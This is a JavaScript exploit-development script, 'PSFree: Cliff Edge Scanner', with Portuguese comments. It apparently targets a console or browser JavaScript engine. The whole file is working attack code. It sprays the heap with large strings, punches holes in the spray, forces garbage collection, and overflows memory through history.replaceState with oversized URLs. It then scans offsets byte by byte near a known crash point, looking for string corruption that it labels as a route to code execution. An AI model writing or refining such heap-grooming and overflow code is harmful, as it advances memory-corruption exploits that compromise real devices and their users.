/* PSFree: Cliff Edge Scanner (1-Byte Precision) */

import { log, sleep } from './module/utils.mjs';

// Ponto Crítico (Crash Point)
const CRASH_POINT = 709523;

// Vamos varrer uma janela pequena ao redor do crash point
const START_OFFSET = CRASH_POINT + 5; // 709528
const END_OFFSET = CRASH_POINT - 32;  // 709491

const OVERFLOW_AMT = 1024 * 64; 
const TARGET_SIZE = 1024 * 1024; 
const PAYLOAD_SIZE = TARGET_SIZE - 24; 

var victims = [];

async function main() {
    log("=== PSFree: Cliff Edge Scanner ===");
    log(`Focando no ponto de crash ${CRASH_POINT} com precisão de 1 byte...`);

    // Loop byte a byte
    for (let off = START_OFFSET; off >= END_OFFSET; off--) {
        
        // Lógica de Retry para estabilidade
        let success = false;
        for(let retry=0; retry<2; retry++) {
            
            await prepare_heap();
            let result = await trigger(off);
            
            if (result) {
                if (result.type === 'RCE') {
                    alert(`JACKPOT NO OFFSET ${off}!`);
                    return;
                }
                if (result.type === 'DATA') {
                    log(`[${off}] Pegou DADOS (Cobre o 523).`, 'yellow');
                    success = true; // Se pegou dados, o offset é válido para escrita, só falta alinhar o header
                    break; 
                }
            }
            
            // Limpa e tenta de novo
            victims = [];
            await forceGC();
        }
        
        if (!success) {
             // log(`[${off}] Miss.`); // Comentado para não poluir, descomente se quiser ver tudo
        }
        
        if (off % 5 === 0) log(`Escaneando... ${off}`);
    }
    
    log("Fim da varredura fina.", 'red');
}

async function prepare_heap() {
    let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
    rawBuffer.fill(0x42); 
    let decoder = new TextDecoder("utf-8");
    let baseString = decoder.decode(rawBuffer);

    victims = [];
    const SPRAY_COUNT = 60;

    for(let i=0; i<SPRAY_COUNT; i++) {
        let s = i + "_" + baseString.substring((i+"_").length);
        victims.push(s);
    }

    for(let i=0; i<SPRAY_COUNT; i+=2) victims[i] = null;
    await forceGC();
}

async function trigger(offset) {
    try {
        let buffer = "A".repeat(offset);
        buffer += "\x01".repeat(OVERFLOW_AMT);
        history.replaceState({}, "scan", "/" + buffer);
        return check_corruption();
    } catch(e) { return null; }
}

function check_corruption() {
    for(let i=1; i<victims.length; i+=2) {
        let s = victims[i];
        if(!s) continue;
        try {
            let err = new Error(s);
            let msg = err.message;

            if (msg.length !== PAYLOAD_SIZE) {
                log(`!!! JACKPOT !!! Length: ${msg.length}`, 'green');
                return { type: 'RCE' };
            }
            if (msg.charCodeAt(0) !== 66) {
                return { type: 'DATA' };
            }
        } catch(e) {}
    }
    return null;
}

async function forceGC() {
    try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
    return new Promise(r => setTimeout(r, 200));
}

main();
